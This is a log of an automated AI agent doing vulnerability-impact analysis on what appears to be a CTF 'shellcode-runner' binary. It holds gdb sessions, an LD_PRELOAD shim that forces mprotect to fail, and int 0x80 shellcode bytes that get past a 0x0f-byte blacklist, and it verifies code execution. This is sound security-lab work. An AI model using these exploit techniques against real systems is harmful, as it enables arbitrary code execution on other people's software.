14:48:35 [impact:BUG-001]   ← run_script(3.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: CODE_EXECUTION === ⏎   Input: 10 NOP bytes (0x90 * 10) ⏎   Return code: -11 ⏎   stdout: b'\nInput y...(1356 chars)
14:48:35 [impact:BUG-001] → 调用 GLM...
14:49:53 [impact:BUG-001] ← GLM(78.6s): 调工具[submit_final_result]
14:49:53 [impact:BUG-001] PoC 运行成功，所有证据均已收集。让我总结一下关键发现：  **关键修正 S2 的分析：** - S2 声称 `mprotect(buf, 0x64, 4)` 中 4=PROT_READ，导致页面不可执行 → NX 违规 → SIGSEGV - **实际情况**：4=PROT_EXEC (Linu
14:49:53 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，19383 chars）
14:49:53 [impact:BUG-001] → 调用 GLM...
14:50:02 [impact:BUG-001] ← GLM(9.1s)
14:50:02 [impact:BUG-001] 报告已成功提交。以下是 BUG-001 的 S3 分析摘要：  ## 关键发现  **S2 的根本原因分析被修正：** S2 声称 `mprotect(buf, 0x64, 4)` 使用了 `PROT_READ=4`，使页面变为不可执行 → NX 违规 → `SIGSEGV`。这是**不正确的**。
14:50:02 === impact (bug_id=BUG-002) ===
14:50:02 [impact:BUG-002] → 调用 GLM...
14:50:06 [impact:BUG-002] ← GLM(3.3s): 调工具[disassemble, checksec]
14:50:06 [impact:BUG-002] 我将分析 BUG-002（`MPROTECT_RETURN_VALUE_UNCHECKED`）。让我先了解二进制文件和漏洞细节，然后推导并验证原语。  让我先检查反汇编和关键代码路径。
14:50:06 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "main", "lines": 200})
14:50:06 [impact:BUG-002]   → 工具 checksec({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:50:06 [impact:BUG-002]   ← disassemble(0.0s): 000000000000132e <main>: ⏎     132e:	endbr64 ⏎     1332:	push   rbp ⏎     1333:	mov    rbp,rsp ⏎     1336:	sub    rsp,0x20 ⏎     133a:	mov    rax,QWOR...(3281 chars)
14:50:06 [impact:BUG-002]   ← checksec(0.3s): [*] '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Full RELRO ⏎     Stac...(305 chars)
14:50:06 [impact:BUG-002] → 调用 GLM...
14:50:12 [impact:BUG-002] ← GLM(6.0s): 调工具[probe_io, gdb_run]
14:50:12 [impact:BUG-002] 很好。我可以看到完整的反汇编。关键观察结果： 1. 在 `0x1429` 处：调用了 `mprotect(buf, 0x64, 4)`，在 `0x142e` 处紧接着是 `xor rax,rax` —— 没有返回值检查。 2. 如果 `mprotect` 失败，缓冲区将保持 `RWX` 状态，并且 
14:50:12 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "input": "AAAA"})
14:50:12 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; info registers rax; x/4gx 0x13370)
14:50:12 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(231 chars)
14:50:12 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(482 chars)
14:50:12 [impact:BUG-002] → 调用 GLM...
14:50:16 [impact:BUG-002] ← GLM(4.5s): 调工具[gdb_run]
14:50:17 [impact:BUG-002] 太棒了！关键发现： 1. 断点在 `0x1429` (mprotect 调用) 处触发，此时 `rax=0x13370000` (缓冲区地址)。 2. 缓冲区包含 `0x41414141` (我们的 "AAAA" 输入)。 3. mprotect 执行后，程序在 `0x13370000` 处崩溃并引
14:50:17 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; si; print/x $rax; info registers )
14:50:17 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(348 chars)
14:50:17 [impact:BUG-002] → 调用 GLM...
14:50:20 [impact:BUG-002] ← GLM(3.8s): 调工具[gdb_run]
14:50:20 [impact:BUG-002] 我已单步进入 `mprotect`。现在我需要单步执行它以获取返回值。让我设置一个断点在 `mprotect` 调用之后，以捕获返回值。
14:50:20 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; ni; print/x $rax; info registers )
14:50:20 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(325 chars)
14:50:20 [impact:BUG-002] → 调用 GLM...
14:50:30 [impact:BUG-002] ← GLM(9.4s): 调工具[gdb_run]
14:50:30 [impact:BUG-002] 关键发现：`mprotect` 返回 0（成功）。因此，在正常条件下，`mprotect(buf, 0x64, 4)` 执行成功，缓冲区变为 `PROT_READ`（不可执行），并且程序在 `jmp` 时崩溃。  BUG-002 的核心问题是：`mprotect` 是否可能失败？如果失败，缓冲区将保
14:50:30 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; ni; print/x $rax; x/4gx 0x1337000)
14:50:30 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(2980 chars)
14:50:30 [impact:BUG-002] → 调用 GLM...
14:50:37 [impact:BUG-002] ← GLM(7.2s): 调工具[gdb_run]
14:50:37 [impact:BUG-002] 非常有趣！关键发现：在 `mprotect(buf, 0x64, 4)` 执行成功（返回 0）后，`0x13370000` 处的内存映射显示为 `--xp`（没有读、没有写、执行）。等等——这很出乎意料。`mprotect` 调用时使用的是 `PROT_READ=4`，但映射显示为 `--xp`（执
14:50:37 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; info proc mappings; ni; print/x $)
14:50:37 [impact:BUG-002]   ← gdb_run(0.1s): x188000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6 ⏎       0x7ffff7f53000     0x7ffff7fa2000    0x4f000   0x1b0000  r--p   /usr/lib/x86_64...(4090 chars)
14:50:37 [impact:BUG-002] → 调用 GLM...
14:50:52 [impact:BUG-002] ← GLM(14.7s): 调工具[gdb_run]
14:50:52 [impact:BUG-002] 现在我可以看到 mprotect 调用前后的映射情况。mprotect 调用前，0x13370000 处的映射为 `rwxp`（RWX）。mprotect 返回 0（成功）后，映射变为 `--xp`（仅执行，无读/写）。  等等——这很奇怪。`mprotect(buf, 0x64, 4)` 中 `4
14:50:52 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; ni; si; info registers rip rax; x)
14:50:52 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(633 chars)
14:50:52 [impact:BUG-002] → 调用 GLM...
14:50:55 [impact:BUG-002] ← GLM(3.4s): 调工具[gdb_run]
14:50:55 [impact:BUG-002] 我明白了——`si` (step instruction) 正在单步执行 main 函数中的寄存器清除指令，而不是进入 shellcode。让我直接跳转到 `jmp rdi` 指令，看看那里会发生什么。
14:50:55 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; info registers rdi rip; x/4bx 0x)
14:50:55 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(648 chars)
14:50:55 [impact:BUG-002] → 调用 GLM...
14:51:10 [impact:BUG-002] ← GLM(14.7s): 调工具[execute]
14:51:10 [impact:BUG-002] 重要发现：在 `jmp rdi` 之后，RIP 变为 `0x13370000`（跳转成功！），但随后在 `0x13370000` 处执行下一条指令时立即发生了 SIGSEGV。  页面映射显示为 `--xp`（可执行，不可读）。RIP 成功跳转到了 `0x13370000`，这意味着 CPU 确实跳
14:51:10 [impact:BUG-002]   → 工具 execute({"command": "cat /proc/cpuinfo | grep -E \"flags\" | head -1 | tr ' ' '\\n' | grep -E \"shstk|ibt|cet\""})
14:51:10 [impact:BUG-002]   ← execute(0.0s): ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:51:10 [impact:BUG-002] → 调用 GLM...
14:51:16 [impact:BUG-002] ← GLM(6.1s): 调工具[write_file]
14:51:16 [impact:BUG-002] CPU 支持 IBT，但不支持 shstk。让我检查一下 IBT 是否确实被强制执行。现在让我专注于 BUG-002 的原语。关键问题是：`mprotect` 是否可能失败，如果失败，shellcode 是否会执行？  让我创建一个 PoC 来演示：如果 `mprotect` 失败，缓冲区将保持 R
14:51:16 [impact:BUG-002]   → 工具 write_file({"content": "#define _GNU_SOURCE\n#include <dlfcn.h>\n#include <sys/mman.h>\n#include <errno.h>\n\n// Intercept mprotect to always fail, simulating th)
14:51:16 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/fail_mprotect.c
14:51:16 [impact:BUG-002] → 调用 GLM...
14:51:19 [impact:BUG-002] ← GLM(2.8s): 调工具[execute]
14:51:19 [impact:BUG-002]   → 工具 execute({"command": "cd /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045 && gcc -shared -fPIC -o libfail_mprotect.so fail_mprotect.c -ldl"})
14:51:19 [impact:BUG-002]   ← execute(0.1s): <no output> ⏎ [Command succeeded with exit code 0]
14:51:19 [impact:BUG-002] → 调用 GLM...
14:51:25 [impact:BUG-002] ← GLM(6.3s): 调工具[gdb_run]
14:51:25 [impact:BUG-002] 现在让我测试一下当 `mprotect` 失败时，`shellcode` 是否会执行。我将使用一个简单的 `shellcode` 来写入一个文件或输出可识别的内容。由于 `0x0f` 字节被列入黑名单，我需要使用 `int 0x80` (`CD 80`) 来进行系统调用。让我创建一个使用 `int 
14:51:25 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "set environment LD_PRELOAD=/work/workspace/0026-2024)
14:51:26 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(3835 chars)
14:51:26 [impact:BUG-002] → 调用 GLM...
14:52:06 [impact:BUG-002] ← GLM(40.6s): 调工具[write_file]
14:52:06 [impact:BUG-002] 关键发现！当 `mprotect` 失败（通过 `LD_PRELOAD` 拦截）时： 1. `0x13370000` 处的映射保持为 `rwxp` (RWX) —— 写入和执行权限均被保留！ 2. `jmp rdi` 成功跳转到 `0x13370000` 3. `RIP` 变为 `0x1337000
14:52:06 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: MPROTECT_RETURN_VALUE_UNCHECKED - Primitive Verification\n\nThis PoC verifies the CODE_EXECUTION)
14:52:06 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py
14:52:06 [impact:BUG-002] → 调用 GLM...
14:52:08 [impact:BUG-002] ← GLM(2.0s): 调工具[run_script]
14:52:08 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py", "timeout": 15})
14:52:08 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] Shellcode length: 67 bytes ⏎ [*] Message offset: 34 ⏎ [*] Message: b'PRIM-001:CODE_EXECUTION_VERIFIED\n' ⏎ [*...(914 chars)
14:52:08 [impact:BUG-002] → 调用 GLM...
14:52:14 [impact:BUG-002] ← GLM(5.9s): 调工具[run_binary]
14:52:14 [impact:BUG-002] PoC 运行成功！关键证据如下：  1. **返回码 = 42** — 我们的 shellcode 调用了 `exit(42)`，且返回码正是 42，证明 shellcode 执行完毕。 2. **Stdout 包含 "PRIM-001:CODE_EXECUTION_VERIFIED"** — 我们
14:52:14 [impact:BUG-002]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "89f983c122b804000000bb01000000ba21000000cd80b801000)
14:52:14 [impact:BUG-002]   ← run_binary(0.0s): rc=42  stdout_len=72 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010...(439 chars)
14:52:14 [impact:BUG-002] → 调用 GLM...
14:52:23 [impact:BUG-002] ← GLM(8.8s): 调工具[gdb_run]
14:52:23 [impact:BUG-002] 等等！这太出乎意料了！在没有 `LD_PRELOAD` 的情况下，shellcode 居然执行成功了！返回码是 42，并且消息 "PRIM-001:CODE_EXECUTION_VERIFIED" 出现在了 stdout 中！  这意味着 `mprotect(buf, 0x64, 4)`（其中 4=
14:52:23 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; info proc mappings; si; info reg)
14:52:23 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(724 chars)
14:52:23 [impact:BUG-002] → 调用 GLM...
14:52:28 [impact:BUG-002] ← GLM(4.5s)
14:52:28 [impact:BUG-002] `stdin_hex` 没有被正确输入到 `gdb_run` 中。`gdb_run` 的 `stdin` 参数接收的是文本，而不是十六进制。让我使用 `stdin` 参数配合原始 shellcode。实际上，问题在于 `gdb_run` 的 `stdin` 是文本，而我的 shellcode 包含不
14:52:28 [retry] 无 submit（1/5），原地重试...
14:52:28 [impact:BUG-002] → 调用 GLM...
14:52:32 [impact:BUG-002] ← GLM(4.2s)
14:52:32 [impact:BUG-002] 让我继续验证。我需要使用带有原始 shellcode 字节的 payload 文件来测试 gdb。
14:52:32 [retry] 无 submit（2/5），原地重试...
14:52:32 [impact:BUG-002] → 调用 GLM...
14:52:35 [impact:BUG-002] ← GLM(3.6s)
14:52:35 [impact:BUG-002] 让我使用正确的参数创建一个 payload 文件。
14:52:35 [retry] 无 submit（3/5），原地重试...
14:52:35 [impact:BUG-002] → 调用 GLM...
14:52:42 [impact:BUG-002] ← GLM(7.0s): 调工具[make_payload]
14:52:42 [impact:BUG-002]   → 工具 make_payload({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload.bin", "parts": [["\\x89\\xf9\\x83\\xc1\\x22\\xb8\\x04\\x00\\x00)
14:52:42 [impact:BUG-002]   ← make_payload(0.0s): /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload.bin len=67 preview_hex=89f983c122b804000000bb01000000ba21000000cd80b801000000b...(159 chars)
14:52:42 [impact:BUG-002] → 调用 GLM...
14:52:46 [impact:BUG-002] ← GLM(4.0s): 调工具[gdb_run_crash]
14:52:46 [impact:BUG-002] 好的，payload 文件已创建。现在让我使用 gdb 配合该 payload 文件来验证在正常条件下（不使用 LD_PRELOAD）的执行情况。
14:52:46 [impact:BUG-002]   → 工具 gdb_run_crash({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "payload_file": "/work/workspace/0026-2024-49-shellcode-runner-3-)
14:52:46 [impact:BUG-002]   ← gdb_run_crash(0.1s): {"raw_tail": "hread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nInput your ...(327 chars)
14:52:46 [impact:BUG-002] → 调用 GLM...
14:52:54 [impact:BUG-002] ← GLM(7.3s): 调工具[gdb_run]
14:52:54 [impact:BUG-002] 这太关键了！程序以代码 052（八进制 52 = 十进制 42）退出，并且消息 "PRIM-001:CODE_EXECUTION_VERIFIED" 被打印到 stdout！这是在没有使用 LD_PRELOAD 的情况下发生的——在正常条件下！  这意味着即使调用了 `mprotect(buf, 0
14:52:54 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:52:54 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(3153 chars)
14:52:54 [impact:BUG-002] → 调用 GLM...
14:53:38 [impact:BUG-002] ← GLM(43.9s): 调工具[write_file]
14:53:38 [impact:BUG-002] 这是一个重大发现！页面是 `--xp`（仅可执行，不可读），但 shellcode 仍然在执行！RIP 正在穿过 shellcode： - 0x13370000 → 0x13370002 → 0x13370005（执行我们的 `mov ecx, edi; add ecx, 0x22` 指令）  在 
14:53:38 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: MPROTECT_RETURN_VALUE_UNCHECKED - Primitive Verification\n\nThis PoC verifies the CODE_EXECUTION)
14:53:38 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py
14:53:38 [impact:BUG-002] → 调用 GLM...
14:53:41 [impact:BUG-002] ← GLM(3.4s): 调工具[run_script]
14:53:41 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py", "timeout": 30})
14:53:41 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] Shellcode length: 67 bytes ⏎ [*] Message offset: 34 ⏎  ⏎ ====================================================...(2119 chars)
14:53:41 [impact:BUG-002] → 调用 GLM...
14:54:01 [impact:BUG-002] ← GLM(19.5s): 调工具[write_file]
14:54:01 [impact:BUG-002] 两个原语均已验证。现在让我更仔细地理解其完整含义。关键发现是：  1. **PRIM-001**: 在正常条件下，`mprotect(buf, 0x64, 4)`（其中 4=PROT_EXEC）使页面变为仅执行（`--xp`）。在 x86-64 上，指令获取在仅执行页面上有效。Shellcode 执
14:54:01 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Test whether shellcode can READ from the execute-only page.\nUnder normal conditions (mprotect s)
14:54:01 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_read.py
14:54:01 [impact:BUG-002] → 调用 GLM...
14:54:03 [impact:BUG-002] ← GLM(2.1s): 调工具[run_script]
14:54:03 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_read.py", "timeout": 30})
14:54:03 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] Shellcode length: 31 bytes ⏎ [*] Shellcode attempts to READ 8 bytes from 0x13370000 (shellcode page) ⏎ [*] If...(919 chars)
14:54:03 [impact:BUG-002] → 调用 GLM...
14:54:13 [impact:BUG-002] ← GLM(10.6s): 调工具[execute]
14:54:13 [impact:BUG-002] 非常有趣！在正常条件下（mprotect 成功，页面为 `--xp`），shellcode 仍然能够从页面读取数据！返回码是 43，并且 shellcode 的字节被写入了 stdout。  这很令人惊讶。页面映射显示为 `--xp`（不可读），但 `int 0x80` write 系统调用能够从该
14:54:13 [impact:BUG-002]   → 工具 execute({"command": "uname -r"})
14:54:13 [impact:BUG-002]   ← execute(0.0s): 6.18.33.2-microsoft-standard-WSL2 ⏎  ⏎ [Command succeeded with exit code 0]
14:54:13 [impact:BUG-002] → 调用 GLM...
14:54:35 [impact:BUG-002] ← GLM(21.7s): 调工具[write_file]
14:54:35 [impact:BUG-002] 内核 6.18。在现代 x86-64 Linux 内核上，当只请求 PROT_EXEC 时，可能会隐式添加 PROT_READ，因为 x86-64 页表在许多配置中没有独立的执行和读取位（除非使用了 PKU/MPK）。在没有 MPK (Memory Protection Keys) 的情况下，x86
14:54:35 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Test whether shellcode can WRITE to the shellcode page.\nUnder normal conditions (mprotect succe)
14:54:35 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_write.py
14:54:35 [impact:BUG-002] → 调用 GLM...
14:54:38 [impact:BUG-002] ← GLM(3.1s): 调工具[run_script]
14:54:38 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_write.py", "timeout": 30})
14:54:38 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] Shellcode length: 38 bytes ⏎ [*] Shellcode attempts to WRITE 0x42 to 0x13370030 (shellcode page) ⏎ [*] Then r...(772 chars)
14:54:38 [impact:BUG-002] → 调用 GLM...
14:55:17 [impact:BUG-002] ← GLM(39.1s): 调工具[write_file]
14:55:17 [impact:BUG-002] 这是 BUG-002 的决定性证据：  **测试 1（正常条件，mprotect 成功）：** - 返回代码：-11 (SIGSEGV) - shellcode 尝试写入页面 → SIGSEGV - 页面是 r-x（可读 + 可执行，不可写） - 写入被正确阻止  **测试 2（mprotect 失
14:55:17 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: MPROTECT_RETURN_VALUE_UNCHECKED - Primitive Verification PoC\n\nTarget: /work/workspace/0026-202)
14:55:17 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py
14:55:17 [impact:BUG-002] → 调用 GLM...
14:55:20 [impact:BUG-002] ← GLM(2.3s): 调工具[run_script]
14:55:20 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-002.py", "timeout": 30})
14:55:20 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-002: MPROTECT_RETURN_VALUE_UNCHECKED...(2439 chars)
14:55:20 [impact:BUG-002] → 调用 GLM...
14:55:24 [impact:BUG-002] ← GLM(4.3s): 调工具[delete, delete]
14:55:24 [impact:BUG-002] 三个原语均已通过动态证据验证。现在让我清理临时文件并准备最终报告。
14:55:24 [impact:BUG-002]   → 工具 delete({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_read.py"})
14:55:24 [impact:BUG-002]   → 工具 delete({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_write.py"})
14:55:24 [impact:BUG-002]   ← delete(0.0s): Deleted /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_read.py
14:55:24 [impact:BUG-002]   ← delete(0.0s): Deleted /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/test_write.py
14:55:24 [impact:BUG-002] → 调用 GLM...
14:55:26 [impact:BUG-002] ← GLM(2.0s): 调工具[ls]
14:55:26 [impact:BUG-002] 现在让我验证 PoC 文件和 libfail_mprotect.so 是否存在，然后提交最终报告。
14:55:26 [impact:BUG-002]   → 工具 ls({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045"})
14:55:26 [impact:BUG-002]   ← ls(0.0s): ['/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/core.69942', '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/core.7...(1211 chars)
14:55:26 [impact:BUG-002] → 调用 GLM...
14:57:22 [impact:BUG-002] ← GLM(116.1s): 调工具[submit_final_result]
14:57:22 [impact:BUG-002] 很好。PoC 文件 `poc-BUG-002.py` 和 `libfail_mprotect.so` 都存在。现在让我提交最终报告。  让我总结一下关键发现：  1. **BUG-002**：`mprotect(buf, 0x64, 4)` 在 0x1429 处的返回值未被检查。如果 `mprote
14:57:22 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，25121 chars）
14:57:22 [impact:BUG-002] → 调用 GLM...
14:57:29 [impact:BUG-002] ← GLM(6.8s)
14:57:29 [impact:BUG-002] BUG-002 的 S3 Primitive 分析与验证已完成。以下是关键发现总结：  **3 个 Primitive 全部 VERIFIED：**  1. **PRIM-001 (CODE_EXECUTION, 正常条件)** — 即使 mprotect 成功（返回 0），页面仍保留执行权限。关键
14:57:29 === impact (bug_id=BUG-003) ===
14:57:29 [impact:BUG-003] → 调用 GLM...
14:57:33 [impact:BUG-003] ← GLM(3.7s): 调工具[disassemble, disassemble]
14:57:33 [impact:BUG-003] 我将分析 BUG-003 (BLACKLIST_INCOMPLETE_FILTER) 以推导并验证其原语 (primitives)。  让我先理解该二进制文件和 BUG 的上下文，然后检查运行时行为。
14:57:33 [impact:BUG-003]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "blacklist"})
14:57:33 [impact:BUG-003]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "main"})
14:57:33 [impact:BUG-003]   ← disassemble(0.0s): 00000000000012ed <blacklist>: ⏎     12ed:	endbr64 ⏎     12f1:	push   rbp ⏎     12f2:	mov    rbp,rsp ⏎     12f5:	mov    QWORD PTR [rbp-0x18],rdi ⏎     ...(741 chars)
14:57:33 [impact:BUG-003]   ← disassemble(0.0s): 000000000000132e <main>: ⏎     132e:	endbr64 ⏎     1332:	push   rbp ⏎     1333:	mov    rbp,rsp ⏎     1336:	sub    rsp,0x20 ⏎     133a:	mov    rax,QWOR...(3281 chars)
14:57:33 [impact:BUG-003] → 调用 GLM...
14:57:41 [impact:BUG-003] ← GLM(8.2s): 调工具[execute, execute]
14:57:41 [impact:BUG-003] 现在让我来理解一下关键事实：  1. **BUG-003**: 黑名单仅过滤字节 `0x0f`（`syscall` 指令的第一个字节）。它不会过滤 `0xCD 0x80` (`int 0x80`)。 2. **BUG-001**: `mprotect(buf, 0x64, 4)` 将缓冲区设置为 `
14:57:41 [impact:BUG-003]   → 工具 execute({"command": "cat /proc/cpuinfo | grep -E \"flags\" | head -1 | tr ' ' '\\n' | grep -iE \"shstk|ibt|cet\""})
14:57:41 [impact:BUG-003]   → 工具 execute({"command": "cat /proc/sys/kernel/randomize_va_space"})
14:57:41 [impact:BUG-003]   ← execute(0.0s): 2 ⏎  ⏎ [Command succeeded with exit code 0]
14:57:41 [impact:BUG-003]   ← execute(0.0s): ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:57:41 [impact:BUG-003] → 调用 GLM...
14:57:45 [impact:BUG-003] ← GLM(3.9s): 调工具[execute, probe_io]
14:57:45 [impact:BUG-003] CPU 支持 IBT。让我检查一下 CET 是否确实在内核中被强制执行，并测试运行时行为。
14:57:45 [impact:BUG-003]   → 工具 execute({"command": "dmesg 2>/dev/null | grep -i cet | head -5; echo \"---\"; cat /proc/cpuinfo | grep -oE \"shstk|ibt\" | sort -u"})
14:57:45 [impact:BUG-003]   → 工具 probe_io({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "input": "AAAA"})
14:57:45 [impact:BUG-003]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(231 chars)
14:57:45 [impact:BUG-003]   ← execute(0.0s): --- ⏎ ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:57:45 [impact:BUG-003] → 调用 GLM...
14:57:48 [impact:BUG-003] ← GLM(2.8s): 调工具[gdb_run]
14:57:48 [impact:BUG-003] 让我检查一下具体的崩溃细节，以了解 SIGSEGV 是由 NX（不可执行页面）还是 IBT 引起的。
14:57:48 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; info registers rdi rip; signal S)
14:57:48 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(899 chars)
14:57:48 [impact:BUG-003] → 调用 GLM...
14:57:51 [impact:BUG-003] ← GLM(3.5s): 调工具[gdb_run]
